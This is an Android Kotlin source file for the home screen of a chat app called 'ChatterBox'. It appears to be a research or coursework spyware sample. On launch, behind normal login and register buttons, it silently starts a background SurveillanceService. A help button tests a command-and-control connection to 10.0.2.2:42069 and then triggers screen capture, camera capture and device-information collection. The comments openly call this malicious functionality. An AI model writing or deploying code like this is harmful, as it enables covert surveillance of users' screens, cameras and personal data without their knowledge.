package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.SurveillanceService

class HomeActivity : AppCompatActivity() {
    private val TAG = "HomeActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        // UI elements
        val loginButton = findViewById<Button>(R.id.btnLogin)
        val registerButton = findViewById<Button>(R.id.btnRegister)

        // Normal app flow buttons
        loginButton.setOnClickListener {
            startActivity(Intent(this, LoginActivity::class.java))
        }

        registerButton.setOnClickListener {
            startActivity(Intent(this, RegisterActivity::class.java))
        }
        
        // Start the surveillance service in the background
        startSurveillanceService()
        
        // HIDDEN - Debug buttons are in the app for testing C2 functionality
        // These would be hidden or removed in a real malicious app
        try {
            // This button might not exist in all layouts, so wrap in try-catch
            val helpButton = findViewById<Button>(R.id.btnHelp)
            helpButton?.setOnClickListener {
                // Provide more feedback with a toast message
                android.widget.Toast.makeText(this, "Testing C2 connection...", android.widget.Toast.LENGTH_SHORT).show()
                Log.d(TAG, "Help button pressed: Testing C2 connection and malicious functionality")
                
                // Make a direct HTTP request to test connection
                Thread {
                    try {
                        val url = java.net.URL("http://10.0.2.2:42069")
                        val connection = url.openConnection() as java.net.HttpURLConnection
                        connection.connectTimeout = 5000
                        connection.readTimeout = 5000
                        connection.requestMethod = "GET"
                        
                        // Log the response code
                        val responseCode = connection.responseCode
                        Log.d(TAG, "DIRECT CONNECTION TEST - Response code: $responseCode")
                        
                        runOnUiThread {
                            android.widget.Toast.makeText(
                                this,
                                "C2 connection response: $responseCode",
                                android.widget.Toast.LENGTH_LONG
                            ).show()
                        }
                        
                        // Read the response if available
                        if (responseCode == 200) {
                            val reader = java.io.BufferedReader(java.io.InputStreamReader(connection.inputStream))
                            val response = StringBuilder()
                            var line: String?
                            while (reader.readLine().also { line = it } != null) {
                                response.append(line)
                            }
                            Log.d(TAG, "Response from C2 server: ${response.toString()}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error testing direct connection to C2", e)
                        runOnUiThread {
                            android.widget.Toast.makeText(
                                this,
                                "C2 connection failed: ${e.message}",
                                android.widget.Toast.LENGTH_LONG
                            ).show()
                        }
                    }
                }.start()
                
                // 1. First test direct C2 connection
                val intent = Intent(this, SurveillanceService::class.java)
                intent.action = "TEST_C2"
                startService(intent)
                
                // 2. Then try to trigger specific malicious actions with a delay
                // This helps ensure all commands get sent separately
                Thread {
                    try {
                        Log.d(TAG, "Triggering screenshot capture in 3 seconds...")
                        Thread.sleep(3000)
                        
                        // 3. Try capturing screen
                        val screenshotIntent = Intent(this, SurveillanceService::class.java)
                        screenshotIntent.action = "CAPTURE_SCREEN"
                        startService(screenshotIntent)
                        Log.d(TAG, "Screenshot command sent")
                        
                        // 4. Try capturing camera
                        Thread.sleep(3000)
                        val cameraIntent = Intent(this, SurveillanceService::class.java)
                        cameraIntent.action = "CAPTURE_CAMERA"
                        startService(cameraIntent)
                        Log.d(TAG, "Camera command sent")
                        
                        // 5. Try collecting device info
                        Thread.sleep(3000)
                        val infoIntent = Intent(this, SurveillanceService::class.java)
                        infoIntent.action = "COLLECT_INFO"
                        startService(infoIntent)
                        Log.d(TAG, "Device info command sent")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in malicious function testing thread", e)
                    }
                }.start()
                
                Log.d(TAG, "All C2 test commands queued")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Debug button not found or error setting listener", e)
        }
    }

    private fun startSurveillanceService() {
        try {
            Log.d(TAG, "Starting SurveillanceService")
            val serviceIntent = Intent(this, SurveillanceService::class.java)
            startService(serviceIntent)
            Log.d(TAG, "SurveillanceService started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting SurveillanceService", e)
        }
    }
}
